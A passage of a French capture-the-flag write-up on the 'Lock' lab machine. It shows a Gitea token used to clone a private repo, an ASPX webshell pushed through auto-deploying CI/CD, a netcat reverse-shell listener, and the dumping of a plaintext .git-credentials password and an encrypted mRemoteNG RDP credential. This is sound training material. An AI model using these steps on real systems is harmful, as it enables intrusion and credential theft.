+        data-sizes="auto"
+        alt="/images/Lock/Lock-8.png"
+        title="/images/Lock/Lock-8.png" width="672" height="590" /></p>
+<h1 id="shell-en-tant-que-ellenfreeman">Shell en tant que Ellen.Freeman</h1>
+<h2 id="énumérer-gitea">Énumérer Gitea</h2>
+<p>Je crée alors cette variable d&rsquo;environnement sur ma machine avec sa valeur. Je télécharge aussi le script et je l&rsquo;exécute. Je vois donc qu&rsquo;il existe un deuxième repo <code>website</code> qui n&rsquo;est accessible qu&rsquo;avec cette variable.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Lock
+</span></span><span class="line"><span class="cl">❯ <span class="nb">export</span> <span class="nv">GITEA_ACCESS_TOKEN</span><span class="o">=</span><span class="s1">&#39;43ce39bb0bd6bc489284f2905f033ca467a6362f&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/workspace/Lock
+</span></span><span class="line"><span class="cl">❯ <span class="nb">echo</span> <span class="nv">$GITEA_ACCESS_TOKEN</span>
+</span></span><span class="line"><span class="cl">43ce39bb0bd6bc489284f2905f033ca467a6362f
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/workspace/Lock
+</span></span><span class="line"><span class="cl">❯ python3 getRepo.py http://10.129.234.64:3000
+</span></span><span class="line"><span class="cl">Repositories:
+</span></span><span class="line"><span class="cl">- ellen.freeman/dev-scripts
+</span></span><span class="line"><span class="cl">- ellen.freeman/website</span></span></code></pre></div></div>
+<p>Je n&rsquo;ai pas le droit d&rsquo;accéder directement au repo <code>website</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-9.png"
+        data-srcset="/images/Lock/Lock-9.png, /images/Lock/Lock-9.png 1.5x, /images/Lock/Lock-9.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-9.png"
+        title="/images/Lock/Lock-9.png" width="1093" height="577" /></p>
+<p>J&rsquo;utilise alors curl pour accéder au contenu de la page <code>/api/v1/user/repos</code> afin d&rsquo;afficher toutes les informations.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -H <span class="s2">&#34;Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f&#34;</span> http://10.129.234.64:3000/api/v1/user/repos <span class="p">|</span> jq .</span></span></code></pre></div></div>
+<p>Je trouve alors l&rsquo;emplacement du repo <code>website</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">},</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;name&#34;</span><span class="err">:</span> <span class="s2">&#34;website&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;full_name&#34;</span><span class="err">:</span> <span class="s2">&#34;ellen.freeman/website&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;description&#34;</span><span class="err">:</span> <span class="s2">&#34;&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;empty&#34;</span><span class="err">:</span> <span class="kc">false</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;private&#34;</span><span class="err">:</span> <span class="kc">true</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;fork&#34;</span><span class="err">:</span> <span class="kc">false</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;template&#34;</span><span class="err">:</span> <span class="kc">false</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;parent&#34;</span><span class="err">:</span> <span class="kc">null</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;mirror&#34;</span><span class="err">:</span> <span class="kc">false</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;size&#34;</span><span class="err">:</span> <span class="mi">7370</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;language&#34;</span><span class="err">:</span> <span class="s2">&#34;CSS&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;languages_url&#34;</span><span class="err">:</span> <span class="s2">&#34;http://localhost:3000/api/v1/repos/ellen.freeman/website/languages&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;html_url&#34;</span><span class="err">:</span> <span class="s2">&#34;http://localhost:3000/ellen.freeman/website&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;url&#34;</span><span class="err">:</span> <span class="s2">&#34;http://localhost:3000/api/v1/repos/ellen.freeman/website&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;link&#34;</span><span class="err">:</span> <span class="s2">&#34;&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;ssh_url&#34;</span><span class="err">:</span> <span class="s2">&#34;ellen.freeman@localhost:ellen.freeman/website.git&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;clone_url&#34;</span><span class="err">:</span> <span class="s2">&#34;http://localhost:3000/ellen.freeman/website.git&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;original_url&#34;</span><span class="err">:</span> <span class="s2">&#34;&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;website&#34;</span><span class="err">:</span> <span class="s2">&#34;&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;stars_count&#34;</span><span class="err">:</span> <span class="mi">0</span><span class="err">,</span></span></span></code></pre></div></div>
+<p>Je clone alors ce repo sur ma machine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Lock
+</span></span><span class="line"><span class="cl">❯ git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git
+</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;website&#39;</span>...
+</span></span><span class="line"><span class="cl">remote: Enumerating objects: 165, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Counting objects: 100% <span class="o">(</span>165/165<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Compressing objects: 100% <span class="o">(</span>128/128<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">remote: Total <span class="m">165</span> <span class="o">(</span>delta 35<span class="o">)</span>, reused <span class="m">153</span> <span class="o">(</span>delta 31<span class="o">)</span>, pack-reused <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>165/165<span class="o">)</span>, 7.16 MiB <span class="p">|</span> 1.05 MiB/s, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>35/35<span class="o">)</span>, <span class="k">done</span>.</span></span></code></pre></div></div>
+<p>S&rsquo;y trouvent plusieurs fichiers. C&rsquo;est le code source du site web sur le port <strong>80</strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">website git:main
+</span></span><span class="line"><span class="cl">❯ ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">40</span>
+</span></span><span class="line"><span class="cl">drwxrwsr-x <span class="m">4</span> root rvm  <span class="m">4096</span> Dec  <span class="m">7</span> 14:32 .
+</span></span><span class="line"><span class="cl">drwxrws--- <span class="m">3</span> root rvm  <span class="m">4096</span> Dec  <span class="m">7</span> 14:32 ..
+</span></span><span class="line"><span class="cl">drwxrwsr-x <span class="m">6</span> root rvm  <span class="m">4096</span> Dec  <span class="m">7</span> 14:32 assets
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root rvm    <span class="m">43</span> Dec  <span class="m">7</span> 14:32 changelog.txt
+</span></span><span class="line"><span class="cl">drwxrwsr-x <span class="m">8</span> root rvm  <span class="m">4096</span> Dec  <span class="m">7</span> 14:32 .git
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root rvm <span class="m">15708</span> Dec  <span class="m">7</span> 14:32 index.html
+</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> root rvm   <span class="m">130</span> Dec  <span class="m">7</span> 14:32 readme.md</span></span></code></pre></div></div>
+<p>Avec le <code>readme.md</code>, j&rsquo;apprends que la CI/DC est toujours active, nous permettant de pouvoir modifier le contenu du repo à distance.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">website git:main
+</span></span><span class="line"><span class="cl">❯ cat readme.md
+</span></span><span class="line"><span class="cl"><span class="c1"># New Project Website</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver#                                                
+</span></span><span class="line"><span class="cl">website git:main
+</span></span><span class="line"><span class="cl">❯ cat changelog.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># Changelog</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">- Added first website version</span></span></code></pre></div></div>
+<h2 id="shell">Shell</h2>
+<p>Vu que le site sur le port <strong>80</strong> est un site <code>ASP.NET</code>, j&rsquo;ajoute au repo un <a href="https://github.com/grov/webshell/blob/master/webshell-LT.aspx" target="_blank" rel="noopener noreffer ">webshell aspx</a>. Puis je l&rsquo;envoie dans le repo du Gitea.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">website git:main
+</span></span><span class="line"><span class="cl">❯ ls
+</span></span><span class="line"><span class="cl">assets  changelog.txt  index.html  readme.md  webshell-LT.aspx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">website git:main
+</span></span><span class="line"><span class="cl">❯ git add webshell-LT.aspx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">website git:main*
+</span></span><span class="line"><span class="cl">❯ git commit -m <span class="s2">&#34;Ajout du webshell&#34;</span>
+</span></span><span class="line"><span class="cl">Author identity unknown
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*** Please tell me who you are.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  git config --global user.email <span class="s2">&#34;you@example.com&#34;</span>
+</span></span><span class="line"><span class="cl">  git config --global user.name <span class="s2">&#34;Your Name&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">to <span class="nb">set</span> your account<span class="s1">&#39;s default identity.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Omit --global to set the identity only in this repository.
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">fatal: unable to auto-detect email address (got &#39;</span>root@exegol-htb-labs.<span class="o">(</span>none<span class="o">)</span><span class="err">&#39;</span><span class="o">)</span></span></span></code></pre></div></div>
+<p>Lorsque je fais le commit, je vois une erreur. Mais rien de grave, il suffit de mettre une adresse email ainsi qu&rsquo;un username quelconques.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">website git:main*
+</span></span><span class="line"><span class="cl">❯ git config --global user.email z3rodol@lock.vl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">website git:main*
+</span></span><span class="line"><span class="cl">❯ git config --global user.name z3rodol
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">website git:main*
+</span></span><span class="line"><span class="cl">❯ ls
+</span></span><span class="line"><span class="cl">assets  changelog.txt  index.html  readme.md  webshell-LT.aspx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">website git:main*
+</span></span><span class="line"><span class="cl">❯ git commit -m <span class="s2">&#34;Ajout du webshell&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>main 86b0aea<span class="o">]</span> Ajout <span class="m">3</span>
+</span></span><span class="line"><span class="cl"> <span class="m">1</span> file changed, <span class="m">161</span> insertions<span class="o">(</span>+<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> create mode <span class="m">100644</span> webshell-LT.aspx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">website git:main*
+</span></span><span class="line"><span class="cl">❯ git push
+</span></span><span class="line"><span class="cl">Enumerating objects: 4, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">Counting objects: 100% <span class="o">(</span>4/4<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">Delta compression using up to <span class="m">16</span> threads
+</span></span><span class="line"><span class="cl">Compressing objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">Writing objects: 100% <span class="o">(</span>3/3<span class="o">)</span>, 2.06 KiB <span class="p">|</span> 2.06 MiB/s, <span class="k">done</span>.
+</span></span><span class="line"><span class="cl">Total <span class="m">3</span> <span class="o">(</span>delta 1<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">0</span>
+</span></span><span class="line"><span class="cl">remote: . Processing <span class="m">1</span> references
+</span></span><span class="line"><span class="cl">remote: Processed <span class="m">1</span> references in total
+</span></span><span class="line"><span class="cl">To http://10.129.234.64:3000/ellen.freeman/website.git
+</span></span><span class="line"><span class="cl">   0b7b70c..86b0aea  main -&gt; main</span></span></code></pre></div></div>
+<p>Je me rends alors sur le site <code>http://10.129.234.64/webshell-LT.aspx</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-11.png"
+        data-srcset="/images/Lock/Lock-11.png, /images/Lock/Lock-11.png 1.5x, /images/Lock/Lock-11.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-11.png"
+        title="/images/Lock/Lock-11.png" width="1919" height="524" /></p>
+<p>Je met alors mon payload de reverse shell PowerShell.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Lock/Lock-12.png"
+        data-srcset="/images/Lock/Lock-12.png, /images/Lock/Lock-12.png 1.5x, /images/Lock/Lock-12.png 2x"
+        data-sizes="auto"
+        alt="/images/Lock/Lock-12.png"
+        title="/images/Lock/Lock-12.png" width="921" height="440" /></p>
+<p>J&rsquo;obtiens alors un shell en tant que <code>ellen.freeman</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">website</span> <span class="n">git</span><span class="err">:</span><span class="n">main</span><span class="p">*</span>  <span class="n">67s</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="n">-lvnp</span> <span class="mf">9001</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ncat</span><span class="err">:</span> <span class="n">Version</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="p">/</span><span class="n">ncat</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ncat</span><span class="err">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">::</span><span class="err">:</span><span class="mf">9001</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ncat</span><span class="err">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">0</span><span class="err">:</span><span class="mf">9001</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ncat</span><span class="err">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">10.129</span><span class="p">.</span><span class="py">234</span><span class="p">.</span><span class="py">64</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ncat</span><span class="err">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">10.129</span><span class="p">.</span><span class="py">234</span><span class="p">.</span><span class="mf">64</span><span class="err">:</span><span class="mf">60044</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">wwwroot</span><span class="p">&gt;</span> <span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">lock</span><span class="p">\</span><span class="n">ellen</span><span class="p">.</span><span class="py">freeman</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">wwwroot</span><span class="p">&gt;</span></span></span></code></pre></div></div>
+<h1 id="shell-en-tant-que-galedekarios">Shell en tant que Gale.Dekarios</h1>
+<h2 id="énumération-1">Énumération</h2>
+<p>Dans le répertoire <code>C:\users\ellen.freeman</code>, se trouve le fichier <code>.git-credentials</code> qui contient les identifiants Gitea de <code>ellen.freeman</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">ellen</span><span class="p">.</span><span class="n">freeman</span><span class="p">&gt;</span> <span class="n">tree</span> <span class="p">/</span><span class="n">f</span>
+</span></span><span class="line"><span class="cl"><span class="n">Folder</span> <span class="n">PATH</span> <span class="n">listing</span>
+</span></span><span class="line"><span class="cl"><span class="n">Volume</span> <span class="n">serial</span> <span class="n">number</span> <span class="n">is</span> <span class="mf">8592</span><span class="n">-A9D9</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>   <span class="p">.</span><span class="nb">git-credentials</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>   <span class="p">.</span><span class="n">gitconfig</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>
+</span></span><span class="line"><span class="cl"><span class="p">+---.</span><span class="py">ssh</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>       <span class="n">authorized_keys</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="mf">-3D</span> <span class="n">Objects</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Contacts</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Desktop</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Documents</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>       <span class="n">config</span><span class="p">.</span><span class="py">xml</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Downloads</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Favorites</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>   <span class="p">?</span>   <span class="n">Bing</span><span class="p">.</span><span class="py">url</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>   <span class="p">?</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>   <span class="p">+--</span><span class="n">-Links</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Links</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>       <span class="n">Desktop</span><span class="p">.</span><span class="py">lnk</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>       <span class="n">Downloads</span><span class="p">.</span><span class="py">lnk</span>
+</span></span><span class="line"><span class="cl"><span class="p">?</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Music</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Pictures</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Saved</span> <span class="n">Games</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Searches</span>
+</span></span><span class="line"><span class="cl"><span class="p">+--</span><span class="n">-Videos</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">users</span><span class="p">\</span><span class="n">ellen</span><span class="p">.</span><span class="n">freeman</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="p">.</span><span class="nb">git-credentials</span>
+</span></span><span class="line"><span class="cl"><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">ellen</span><span class="p">.</span><span class="n">freeman</span><span class="err">:</span><span class="n">YWFrWJk9uButLeqx</span><span class="nv">@localhost</span><span class="err">:</span><span class="mf">3000</span></span></span></code></pre></div></div>
+<p>Le fichier <code>C:\users\ellen.freeman\Documents\config.xml</code> contient les identifiants ainsi que la configuration de <a href="https://github.com/mRemoteNG/mRemoteNG" target="_blank" rel="noopener noreffer ">mRemoteNG</a>, un gestionnaire de connexions distantes open source, à onglets et multi protocoles.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-xml">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">PS C:\users\ellen.freeman&gt; cat Documents/config.xml
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;mrng:Connections</span> <span class="na">xmlns:mrng=</span><span class="s">&#34;http://mremoteng.org&#34;</span> <span class="na">Name=</span><span class="s">&#34;Connections&#34;</span> <span class="na">Export=</span><span class="s">&#34;false&#34;</span> <span class="na">EncryptionEngine=</span><span class="s">&#34;AES&#34;</span> <span class="na">BlockCipherMode=</span><span class="s">&#34;GCM&#34;</span> <span class="na">KdfIterations=</span><span class="s">&#34;1000&#34;</span> <span class="na">FullFileEncryption=</span><span class="s">&#34;false&#34;</span> <span class="na">Protected=</span><span class="s">&#34;sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp&#34;</span> <span class="na">ConfVersion=</span><span class="s">&#34;2.6&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Node</span> <span class="na">Name=</span><span class="s">&#34;RDP/Gale&#34;</span> <span class="na">Type=</span><span class="s">&#34;Connection&#34;</span> <span class="na">Descr=</span><span class="s">&#34;&#34;</span> <span class="na">Icon=</span><span class="s">&#34;mRemoteNG&#34;</span> <span class="na">Panel=</span><span class="s">&#34;General&#34;</span> <span class="na">Id=</span><span class="s">&#34;a179606a-a854-48a6-9baa-491d8eb3bddc&#34;</span> <span class="na">Username=</span><span class="s">&#34;Gale.Dekarios&#34;</span> <span class="na">Domain=</span><span class="s">&#34;&#34;</span> <span class="na">Password=</span><span class="s">&#34;TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==&#34;</span> <span class="na">Hostname=</span><span class="s">&#34;Lock&#34;</span> <span class="na">Protocol=</span><span class="s">&#34;RDP&#34;</span> <span class="na">PuttySession=</span><span class="s">&#34;Default Settings&#34;</span> <span class="na">Port=</span><span class="s">&#34;3389&#34;</span> <span class="na">ConnectToConsole=</span><span class="s">&#34;false&#34;</span> <span class="na">UseCredSsp=</span><span class="s">&#34;true&#34;</span> <span class="na">RenderingEngine=</span><span class="s">&#34;IE&#34;</span> <span class="na">ICAEncryptionStrength=</span><span class="s">&#34;EncrBasic&#34;</span> <span class="na">RDPAuthenticationLevel=</span><span class="s">&#34;NoAuth&#34;</span> <span class="na">RDPMinutesToIdleTimeout=</span><span class="s">&#34;0&#34;</span> <span class="na">RDPAlertIdleTimeout=</span><span class="s">&#34;false&#34;</span> <span class="na">LoadBalanceInfo=</span><span class="s">&#34;&#34;</span> <span class="na">Colors=</span><span class="s">&#34;Colors16Bit&#34;</span> <span class="na">Resolution=</span><span class="s">&#34;FitToWindow&#34;</span> <span class="na">AutomaticResize=</span><span class="s">&#34;true&#34;</span> <span class="na">DisplayWallpaper=</span><span class="s">&#34;false&#34;</span> <span class="na">DisplayThemes=</span><span class="s">&#34;false&#34;</span> <span class="na">EnableFontSmoothing=</span><span class="s">&#34;false&#34;</span> <span class="na">EnableDesktopComposition=</span><span class="s">&#34;false&#34;</span> <span class="na">CacheBitmaps=</span><span class="s">&#34;false&#34;</span> <span class="na">RedirectDiskDrives=</span><span class="s">&#34;false&#34;</span> <span class="na">RedirectPorts=</span><span class="s">&#34;false&#34;</span> <span class="na">RedirectPrinters=</span><span class="s">&#34;false&#34;</span> <span class="na">RedirectSmartCards=</span><span class="s">&#34;false&#34;</span> <span class="na">RedirectSound=</span><span class="s">&#34;DoNotPlay&#34;</span> <span class="na">SoundQuality=</span><span class="s">&#34;Dynamic&#34;</span> <span class="na">RedirectKeys=</span><span class="s">&#34;false&#34;</span> <span class="na">Connected=</span><span class="s">&#34;false&#34;</span> <span class="na">PreExtApp=</span><span class="s">&#34;&#34;</span> <span class="na">PostExtApp=</span><span class="s">&#34;&#34;</span> <span class="na">MacAddress=</span><span class="s">&#34;&#34;</span> <span class="na">UserField=</span><span class="s">&#34;&#34;</span> <span class="na">ExtApp=</span><span class="s">&#34;&#34;</span> <span class="na">VNCCompression=</span><span class="s">&#34;CompNone&#34;</span> <span class="na">VNCEncoding=</span><span class="s">&#34;EncHextile&#34;</span> <span class="na">VNCAuthMode=</span><span 